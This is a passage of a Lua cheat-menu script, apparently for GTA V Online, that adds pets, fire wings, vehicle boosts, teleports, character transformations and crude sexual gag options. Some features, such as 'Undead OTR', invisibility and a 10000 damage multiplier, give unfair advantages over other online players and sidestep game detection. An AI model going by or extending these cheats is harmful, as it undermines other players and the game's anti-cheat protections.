        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
        GRAPHICS.CLEAR_DRAW_ORIGIN()
    end)
end

local myroot = menu.list(funfun, "Spawn Pets", {}, "These are your active pets.")

local header = menu.divider(myroot, "PetScript BETA")
local allpetsroot = menu.list(myroot, "All Pets", {}, "")
local activepet = menu.list(myroot, "Active Pets", {}, "These are your active pets.")

        menu.toggle(allpetsroot, "Immortal", {}, "Make all your pets immortal", function(on)
            if on then
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, true)
                end
            else
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, false)
                end
            end
        end)

        menu.action(allpetsroot, "Delete All Pets", {}, "", function()
            for k,v in pairs(activedogs) do
                entities.delete_by_handle(v)
            end
        end)
        
menu.action_slider(myroot, "Spawn a Pet", {}, "Spawns a loyal companion that will follow and defend you.", dogs, function(opt, breeds)
    local hash = util.joaat("A_C_" .. breeds)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, math.random(1,4), 0)
    if getgroupsize(mygroup) >= 7 then
        util.toast("You have exceeded the maximum number of pets.")
    else
        local dog_ped = entities.create_ped(26, hash, coords, 0)
        activedogs[#activedogs+1] = dog_ped
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_NEVER_LEAVES_GROUP(dog_ped, true)
        PED.SET_GROUP_SEPARATION_RANGE(mygroup, 99999)

        local thispet = menu.list(activepet, breeds, {}, "")

        --ANIMAL FUNCTIONS BEGIN--

        menu.text_input(thispet, "Set Name", {"setname"}, "", function(name)
            GenerateNametagOnPed(dog_ped, name)
        end)

        menu.toggle(thispet, "Immortal", {}, "", function(on)
            if on then
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, true)
            else
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, false)
            end
        end)

        --DOG SPECIFIC FUNCTIONS--

        if breeds ~= "Cat_01" then

            menu.toggle(thispet, "Sit", {}, "Makes your pet sit.", function(on)
                if on then
                    if breeds == "Rottweiler" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[1], 0, true)
                    elseif breeds == "Retriever" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[2], 0, true)
                    elseif breeds == "Shepherd" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    elseif breeds == "Husky" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    else
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[4], 0, true)

                    end
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)

            --Make Ped Bark

            menu.action(thispet, "Bark", {}, "Bark! Sometimes it may not bark.", function()
                if breeds == "Rottweiler" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_ROTWEILER", 0, true)
                elseif breeds == "Retriever" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_RETRIEVER", 0, true)
                elseif breeds == "Shepherd" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                elseif breeds == "Husky" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                else
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SMALL", 0, true)
                end
                util.yield(5000)
                TASK.CLEAR_PED_TASKS(dog_ped)
            end)
        end

        --CAT SPECIFIC FUNCTIONS--

        if breeds == "Cat_01" then 
            menu.toggle(thispet, "Lie Down and Chill", {}, "", function(on)
                if on then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_CAT_SLEEPING_GROUND", 0, true)
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)
        end

        --DELETE PED
        menu.action(thispet, "Delete Pet", {}, "RIP in Peace, my furry friend.", function()
            entities.delete_by_handle(dog_ped)
            menu.delete(thispet)
        end)
    end
end)

local fire_wings_list = menu.list(funfun, "Fire wings")

----------------------------------------
--Fire Wings
----------------------------------------

local fireWings = {
    [1] = {pos = {[1] = 140, [2] =  75}},
    [2] = {pos = {[1] = 140, [2] = -75}},
    [3] = {pos = {[1] = 150, [2] =  75}},
    [4] = {pos = {[1] = 150, [2] = -75}},
    [5] = {pos = {[1] = 160, [2] =  75}},
    [6] = {pos = {[1] = 160, [2] = -75}},
    [7] = {pos = {[1] = 170, [2] =  75}},
    [8] = {pos = {[1] = 170, [2] = -75}},
}
local fireWingsSettings = {
    scale = 0.3,
    fireColour = colour or {r = 255, g = 255, b = 255, a = 255},
    on = false
}
local ptfxEgg
local firewingPtfx = 'muz_xs_turret_flamethrower_looping'
menu.toggle(fire_wings_list, 'Fire wings', {'ToxfireWings'}, 'Put the wings on your back.', function (toggle)
    fireWingsSettings.on = toggle
    if fireWingsSettings.on then
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
        if ptfxEgg == nil then
            local eggHash = 1803116220
            request_model_load(eggHash)
            ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
            ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
        end
        for i = 1, #fireWings do
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                wait()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(firewingPtfx, ptfxEgg, 0, -0.15, 0.3, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)
            util.create_tick_handler(function()
                local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                for i = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.fireColour.r, fireWingsSettings.fireColour.g, fireWingsSettings.fireColour.b)
                end

                ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                return fireWingsSettings.on
            end)
        end
    else
        for i = 1, #fireWings do
            if fireWings[i].ptfx then
                GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                fireWings[i].ptfx = nil
            end
            if ptfxEgg then
                entities.delete_by_handle(ptfxEgg)
                ptfxEgg = nil
            end
        end
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end) 

menu.slider(fire_wings_list, 'Fire wings scale', {'ToxfireWingsScale'}, '', 1, 100, 3, 1, function(value)
    fireWingsSettings.scale = value / 10
end)

menu.rainbow(menu.colour(fire_wings_list, "Fire wings colour", {'ToxfireWingsColour'}, '', fireWingsSettings.fireColour, false, function(colour)
    fireWingsSettings.fireColour = colour
end))

menu.toggle(funfun, "Super Drive", {"superd"}, "Toggles superdrive and super handbreak.", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("speedlimit" .. " 10000")
        menu.trigger_commands("superdrivespeed" .. " 3.0")
        menu.trigger_commands("superdrive")
        menu.trigger_commands("superhandbreak")
    else
        menu.trigger_commands("superdrive")
        menu.trigger_commands("superhandbreak")
    end
end)

menu.toggle_loop(funfun, 'Stick to surface', {'stickyveh'}, 'Warning! Spawn a vehicle or self crashh! Makes it to where the vehicle sticks to walls(using horn boost on the lowest setting helps get up on the walls, skidded from ajoker script.', function(curcar)
    local curcar = entities.get_user_vehicle_as_handle()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if not PED.IS_PED_IN_VEHICLE(player, PED.GET_VEHICLE_PED_IS_IN(player), false) then
        util.toast("Player isn't in a vehicle. :/")
        return
    end
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, 0, 0, - 0.5, 0, true, true, true, true)
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(curcar, 40)
    end)

menu.toggle_loop(funfun,"Horn boost", {"hornboost"}, "Gives you the ability to speed up their car by pressing honking their horn or activating the siren. Will try fix it for other players soon.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    if not (AUDIO.IS_HORN_ACTIVE(vehicle) or VEHICLE.IS_VEHICLE_SIREN_ON(vehicle)) then return end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
    if AUDIO.IS_HORN_ACTIVE(vehicle) then
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0.0, 1.0, 0.0, true, true, true, true)
    end
end)

menu.slider(funfun, "Change seat", {"switchseat"}, "DriverSeat = -1 Passenger = 0 Left Rear = 1 RightRear = 2", -1, 2, -1, 1, function(seatnumber)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
	local vehicle = entities.get_user_vehicle_as_handle()
	PED.SET_PED_INTO_VEHICLE(ped, vehicle, seatnumber)
end)

menu.toggle(funfun, "Quiet footsteps", {"quietsteps"}, "Disables the sound of your footsteps.", function(toggle)
    AUDIO.SET_PED_FOOTSTEPS_EVENTS_ENABLED(players.user_ped(), not toggle)
end)

util.keep_running()
local player = players.user_ped()
local agroup = "missfbi3ig_0"
local anim = "shit_loop_trev"
local mshit = util.joaat("prop_big_shit_02")
local rshit = util.joaat("prop_big_shit_01")

list = menu.list(funfun, "Poop", {"lpoop"}, "Poo list", function(); end)

menu.action(list, "Massive shit", {"mshit"}, "Make a massive shit", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(mshit, c)
end)

menu.action(list, "Normal shit", {"nshit"}, "Make a normale sized shit", function()
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    c.z = c.z -1
    while not STREAMING.HAS_ANIM_DICT_LOADED(agroup) do 
        STREAMING.REQUEST_ANIM_DICT(agroup)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(player, agroup, anim, 8.0, 8.0, 3000, 0, 0, true, true, true)
    util.yield(1000)
    entities.create_object(rshit, c)
end)

tpf_units = 1
menu.action(funfun, "TP Forward", {"tpforward"}, "", function(on_click)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, tpf_units, 0)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pos['x'], pos['y'], pos['z'], true, false, false)
end)

menu.slider(funfun, "TP Forward", {"tpforward"}, "", 1, 100, 1, 1, function(s)
tpf_units = s
end)

island_block = 0
menu.action(funfun, "Sky Island", {""}, "", function(sky_island)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local windows = {
    {name = "Front Left", number = 0},
    {name = "Front Right", number = 1},
    {name = "Rear Left", number = 2},
    {name = "Rear Right", number = 3},
    {name = "Front Windscreen", number = 4},
    {name = "Rear Windscreen", number = 5},
    {name = "Mid Left", number = 6},
    {name = "Mid Right", number = 7}
}

drawScriptMenu = function()


local wrolls = menu.list(funfun, "Roll Windows", {}, "", function(); end)

ROLL_DOWN_INDIVIDUAL = menu.list(wrolls, "Roll down individual windows")
    for k, v in pairs(windows) do
        menu.action(ROLL_DOWN_INDIVIDUAL, "Roll down " .. v.name .. " window", {}, "Rolls down " .. v.name .. " window", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, v.number)
        end)
    end

ROLL_UP_INDIVIDUAL = menu.list(wrolls, "Roll up individual windows")
    for k, v in pairs(windows) do
        menu.action(ROLL_UP_INDIVIDUAL, "Roll up " .. v.name .. " window", {}, "Rolls up " .. v.name .. " window", function()
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
        end)
    end

menu.action(wrolls, "Roll all down", {"pwcalldown"}, "Rolls all windows of the current vehicle down", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOWS(currentVehicle)
end)

menu.action(wrolls, "Roll all up", {"pwcallup"}, "Rolls all windows of the current vehicle up", function()
    for k, v in pairs(windows) do
        currentVehicle = entities.get_user_vehicle_as_handle()
        VEHICLE.ROLL_UP_WINDOW(currentVehicle, v.number)
    end
end)

menu.action(wrolls, "Roll down front windows", {"pwcfrontdown"}, "Rolls the front left/front right windows down. Probably the most relevant", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 0)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 1)
end)

menu.action(wrolls, "Roll down rear windows", {"pwcreardown"}, "Rolls the rear left/rear right windows down", function()
    currentVehicle = entities.get_user_vehicle_as_handle()
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 2)
    VEHICLE.ROLL_DOWN_WINDOW(currentVehicle, 3)
end)

end
drawScriptMenu()

function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           --attach object to player ped
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)

    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 2, true) 
end
function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            entities.delete_by_handle(object)
        end
    end
end


all_female_sex_voicenames = {
    "S_F_Y_HOOKER_01_WHITE_FULL_01",
    "S_F_Y_HOOKER_01_WHITE_FULL_02",
    "S_F_Y_HOOKER_01_WHITE_FULL_03",
    "S_F_Y_HOOKER_02_WHITE_FULL_01",
    "S_F_Y_HOOKER_02_WHITE_FULL_02",
    "S_F_Y_HOOKER_02_WHITE_FULL_03",
    "S_F_Y_HOOKER_03_BLACK_FULL_01",
    "S_F_Y_HOOKER_03_BLACK_FULL_03",
}

local female_speeches = {
    "SEX_GENERIC_FEM",
    "SEX_HJ",
    "SEX_ORAL_FEM",
    "SEX_CLIMAX",
    "SEX_GENERIC"
}

function moan(pos, gender)
    util.create_thread(function()
        local hash = util.joaat('s_f_y_hooker_01')
        request_model_load(hash)
        local new_ped = entities.create_ped(28, hash, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(new_ped, false, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(new_ped, true)
        local voice_name
        local speech_nam
        if gender == 'f' then
            voice_name = all_female_sex_voicenames[math.random(#all_female_sex_voicenames)]
            speech_name = female_speeches[math.random(#female_speeches)]
        else
            voice_name = "MICHAEL_NORMAL"
            speech_name = "SEX_GENERIC"
        end
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(new_ped, speech_name, voice_name, "SPEECH_PARAMS_FORCE", 0)
        local st_time = os.time()
        while true do 
            if os.time() - st_time >= 5 then 
                entities.delete(new_ped)
                util.stop_thread()
            end
            local c = players.get_position(players.user())
            ENTITY.SET_ENTITY_COORDS(new_ped, c.x, c.y, c.z+3, false, false, false, false)
            util.yield()
        end
    end)
end

	playermode = menu.list(funfun, "Player Modes", {}, "", function(); end)
    
escort_root = menu.list(playermode, "Escort services", {"sexluaescorts"}, "")

menu.toggle_loop(escort_root, "Female Moan", {"fsexmoan"}, "", function(on_click)
    moan(players.get_position(players.user()), 'f')
    util.yield(1500)
end)

menu.toggle_loop(escort_root, "Male Moan", {"msexmoan"}, "", function(on_click)
    moan(players.get_position(players.user()), 'm')
    util.yield(1500)
end)

local custom_hooker_model = 'ig_lestercrest'
menu.text_input(escort_root, "Custom escort model", {"customescortmdl"}, "Enter the model, then go to request escort > custom.", function(on_input)
    custom_hooker_model = on_input
end, 'ig_lestercrest')

local custom_hooker_options = {"Topless", "Tracy", "Paige", "Bartender", "Clone of me", "Femboy", "Custom"}
menu.list_action(escort_root, "Request escort", {"requestescort"}, "Request the most high-end escorts in Los Santos", custom_hooker_options, function(index)
    local hooker
    local c
    pluto_switch index do
        case 1:
            c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
            request_model_load(util.joaat('a_f_y_topless_01'))
            hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
            break
        case 2:
            c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
            request_model_load(util.joaat('cs_tracydisanto'))
            hooker = entities.create_ped(28, util.joaat('cs_tracydisanto'), c, math.random(270))
            break
        case 3:
            c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
            request_model_load(util.joaat('ig_paige'))
            hooker = entities.create_ped(28, util.joaat('ig_paige'), c, math.random(270))
            break
        case 4:
            c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
            request_model_load(util.joaat('s_f_y_bartender_01'))
            hooker = entities.create_ped(28, util.joaat('s_f_y_bartender_01'), c, math.random(270))
            break
        case 5:
            hooker = PED.CLONE_PED(players.user_ped(), true, true, true)
            break
        case 6:
            c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
            request_model_load(util.joaat('u_m_y_staggrm_01'))
            hooker = entities.create_ped(28, util.joaat('u_m_y_staggrm_01'), c, math.random(270))
            break
        case 7:
            c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
            request_model_load(util.joaat(custom_hooker_model))
            hooker = entities.create_ped(28, util.joaat(custom_hooker_model), c, math.random(270))
            break
    end
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), -5.0, 0.0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
    util.toast("Your escort has arrived to your left.")
end)

local max_health
undead_otr = menu.toggle(playermode, "Undead OTR", {"undead"}, "Turn you off the radar without notifying other players.\nNote: Trigger Modded Health detection.", function(on_toggle)
    if on_toggle then
        max_health = ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped())
        while menu.get_state(undead_otr) == "On" do
            if ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
                ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(),0)
            end
            util.yield()
        end
    else
        ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(),max_health)
    end
end)
    
    local obj_pp = {"prop_cs_dildo_01", "prop_ld_bomb_01", "prop_sam_01"}
    local opt_pp = {"Small", "Big", "Bigger", "Delete"}

    menu.list_action(playermode, "Attach Dildo", {}, "This only works on yourself.", opt_pp, function(index, value, click_type)
        pluto_switch index do
            case 1:
                attach_to_player("prop_cs_dildo_01", 57597, -0.1, 0.15, 0, 0, 90, 90)
                break
            case 2:
                attach_to_player("prop_ld_bomb_01", 57597, -0.1, 0.6, 0, 0, 180, 180)
                break
            case 3:
                attach_to_player("prop_sam_01", 57597, -0.1, 1.7, 0, 0, 180, 180)
                break
            case 4:
                for k, model in pairs(obj_pp) do 
                    delete_object(model)
                end
                break
            end
    end)


    menu.toggle_loop(playermode, "Front Flip", {"frontflip"}, "WARNING! Do not click change outfit. Do a front flip.", function(on)
        local hash = util.joaat("prop_ecola_can")
        request_model_load(hash)
        local prop = entities.create_object(hash, players.get_position(players.user()))
        ENTITY.FREEZE_ENTITY_POSITION(prop)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
        local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
        ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
        for i=1, -360, -8 do
            ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
            util.yield()
        end
        ENTITY.DETACH_ENTITY(players.user_ped())
        entities.delete_by_handle(prop)
        util.yield(2000)
    end)


    menu.toggle(playermode, "Furry Mode", {"spawnfurry"}, "Activates Furry, then to Candy's outfit.", function(on)
        if on then
            menu.trigger_commands("IGFurry")
            menu.trigger_commands("walkstyle mop")
            util.toast("Furry On") 
        else
            menu.trigger_commands("outfit1candydinka")
            menu.trigger_commands("walkstyle poshfemale")
            util.toast("Candy Mode On")
            end 
        end)

    menu.toggle(playermode, "Rabbit Mode (BETA)", {"spawnrabbit"}, "WARNING! Causes Crash Events (XA) Soon as you pull out a gun and aim. Activates Rabbit, then to Candy's outfit.", function(on)
        if on then
            menu.trigger_commands("ACRabbit02")
            menu.trigger_commands("walkstyle mop")
            util.toast("Rabbit Mode On") 
        else
            menu.trigger_commands("outfit1candydinka")
            menu.trigger_commands("walkstyle poshfemale")
            util.toast("Candy Mode On")
            end 
        end)

    menu.toggle(playermode, "Yule Monster Mode", {"spawnyulemonster"}, "Activates Yule Monster, then to Candy's outfit.", function(on)
        if on then
            menu.trigger_commands("UMMYuleMonster")
            menu.trigger_commands("walkstyle mop")
            util.toast("Yule Monster Mode On") 
        else
            menu.trigger_commands("outfit1candydinka")
            menu.trigger_commands("walkstyle poshfemale")
            util.toast("Candy Mode On")
            end 
        end)

menu.toggle(playermode, "Hulk Mode", {"hulkmode"}, "Makes you jump high and very strong", function(toggle)
    if toggle then
        menu.trigger_commands("damagemultiplier 10000")
        menu.trigger_commands("superjump")
util.toast("Hulk Mode On")
    else
    menu.trigger_commands("damagemultiplier 1.01")
    menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("superjump")
util.toast("Hulk Mode Off")
    end 
end)

menu.toggle(playermode, "Toggle Sneaky Mode", {"sneakymode"}, "Turns you invisible, off radar and no collisions...", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("invisibility" .. " on")
        menu.trigger_commands("reducedcollision" .. " on")
        menu.trigger_commands("otr")
        menu.trigger_commands("quietsteps")
        util.toast("Sneaky Mode On") 
    else
        menu.trigger_commands("tpmazehelipad")
        menu.trigger_commands("invisibility" .. " off")
        menu.trigger_commands("reducedcollision" .. " off")
        menu.trigger_commands("otr")
        menu.trigger_commands("quietsteps")
        util.toast("Sneaky Mode Off")
        end 
end)

menu.toggle(playermode, "Toggle Pidgeon Mode", {"pidgeonmode"}, "Turns you into a Pidgeon, off radar and no collisions...", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("otr")
        menu.trigger_commands("reducedcollision" .. " on")
        menu.trigger_commands("acpigeon")
        util.yield(100)
        menu.trigger_commands("noguns")
        menu.trigger_commands("allguns")
        util.toast("Pidgeon Mode On") 
    else
        menu.trigger_commands("otr")
        menu.trigger_commands("reducedcollision" .. " off")
        menu.trigger_commands("outfit1candydinka")
        util.toast("Pidgeon Mode Off")
        end 
end)

menu.toggle(playermode, "Toggle Killer Whale Mode", {"killerwhaleonmode"}, "Turns you into a Killer Whale, off radar and no collisions...", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("otr")
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -2592.5793, -612.5788, -34.412697)
        util.yield(1)
        menu.trigger_commands("ackillerwhale")
        util.yield(10)
        menu.trigger_commands("noguns")
        menu.trigger_commands("allguns")
        util.toast("Killer Whale Mode On") 
    else
        menu.trigger_commands("otr")
        menu.trigger_commands("outfit1candydinka")
        util.toast("Killer Whale Off")
        end 
end)

menu.toggle(playermode, "Big Foot Mode", {"bigfoot mode"}, "Activates Big Foot off radar and makes you strong and jump high then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("igorleans")
        menu.trigger_commands("damagemultiplier 10000")
        menu.trigger_commands("superjump")
    menu.trigger_commands("walkstyle verydrunk")
    menu.trigger_commands("otr")
util.toast("Big Foot Mode On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("damagemultiplier 1.01")
    menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("superjump")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

menu.toggle(playermode, "Stunt Monkey Mode", {"stuntmonkey"}, "Activates Chimp and makes you jump high, then to Candy's outfit.", function(on)
if on then
    menu.trigger_commands("acchimp02")
        menu.trigger_commands("superjump")
    menu.trigger_commands("walkstyle mop")
util.toast("Stunt Monkey Mode On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
        menu.trigger_commands("superjump")
util.toast("Candy Mode On")
    end 
end)

	trevs = menu.list(playermode, "Trevor Mode", {}, "", function(); end)

menu.toggle(trevs, "Trevor Mode 1", {"trevormode"}, "Activates pervy Trev off radar, then to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("trevor")
    menu.trigger_commands("walkstyle verydrunk")
    menu.trigger_commands("otr")
util.toast("Trevor Mode 1 On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

menu.toggle(trevs, "Trevor Mode 2", {"trevormode"}, "Activates pervy Trev off radar then, to Candy's outfit on radar.", function(on)
if on then
    menu.trigger_commands("outfit1trevor")
    menu.trigger_commands("walkstyle crouched")
    menu.trigger_commands("otr")
util.toast("Trevor Mode 2 On") 
else
    menu.trigger_commands("outfit1candydinka")
    menu.trigger_commands("walkstyle poshfemale")
    menu.trigger_commands("otr")
util.toast("Candy Mode On")
    end 
end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function start_asteroid_shower()
    meteor_thr = util.create_thread(function(thr)
        while true do
            if not asteroids then
                util.stop_thread()
            end
            local rand_1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 300.0)
            local rand_2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 0.0)
            local diff = {}
            local speed = 200
            diff.x = (rand_2['x'] - rand_1['x'])*speed
            diff.y = (rand_2['y'] - rand_1['y'])*speed
            diff.z = (rand_2['z'] - rand_1['z'])*speed
            local h = 3751297495
            request_model_load(h)
            rand_1.x = rand_1['x']
            rand_1.y = rand_1['y']
            rand_1.z = rand_1['z']
